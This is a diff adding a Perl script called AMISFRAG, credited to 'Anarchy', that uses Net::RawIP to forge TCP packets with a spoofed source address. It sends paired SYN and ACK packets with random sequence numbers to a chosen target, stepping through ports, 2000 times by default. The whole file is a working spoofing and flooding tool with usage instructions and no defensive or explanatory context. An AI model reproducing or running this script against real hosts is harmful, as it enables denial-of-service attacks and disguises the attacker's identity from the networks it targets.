@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+
+use Net::RawIP;
+use Getopt::Std;
+
+getopts('h:s:b:p:c:', \%opt)||die usage();
+if(defined($opt{'h'})) { $target=$opt{'h'} } else { usage() }
+if(defined($opt{'s'})) { $source=$opt{'s'} } else { usage() }
+if(defined($opt{'b'})) { $sport=$opt{'b'} } else { $sport=1 }
+if(defined($opt{'p'})) { $dport=$opt{'p'} } else { $dport=1 }
+if(defined($opt{'c'})) { $count=$opt{'c'} } else { $count=2000 }
+
+
+$i=0;
+$seq=int(rand 9999999998)+1;
+$ack_seq=int(rand 9999999998)+1;
+
+$packet=new Net::RawIP;
+
+for($i; $i<($count+1); $i++) {
+
+$syn=1;
+$ack=0;
+
+$packet->set({ ip  => { ttl      => 64,
+                        protocol => 6,
+                        tos      => 0,
+                        saddr    => $source,
+                        daddr    => $target,
+                      },
+               tcp => { source   => $sport,
+                        dest     => $dport,
+                        window   => 0,
+                        syn      => $syn,
+                        ack      => $ack,
+                        ack_seq  => $ack_seq,
+                        seq      => $seq,
+                      }
+             });
+
+$packet->send;
+
+$syn=0;
+$ack=1;
+
+$packet->set({ ip  => { ttl      => 64,
+                        protocol => 6,
+                        tos      => 0,
+                        saddr    => $source,
+                        daddr    => $target,
+                      },
+               tcp => { source   => $sport,
+                        dest     => $dport,
+                        window   => 0,
+                        syn      => $syn,
+                        ack      => $ack,
+                        ack_seq  => $ack_seq,
+                        seq      => $seq,
+                      }
+             });
+$packet->send; 
+
+$sport++;
+$dport++;
+
+print("Packet: $i\n");
+print("From $source:$sport to $target:$dport.\n");
+print("TOS=0,  TTL=64\n");
+print("Sequence number: $seq,  ACK number: $ack_seq\n\n");
+
+
+}    
+
+
+
+sub usage() {
+    $0=~s#.*/##g;
+    print("\nAMISFRAG - Programmed by Anarchy\n");
+    print("================================\n");
+    print("Usage  : AMISFRAG -s <spoofed ip> -h <target> [options]\n");
+    print("Options: -b [src start port]      (default=1)\n");
+    print("         -p [dst start port]      (default=1)\n");
+    print("         -c <count>               (default=2000)\n\n");
+    exit 0;
+}
+
+
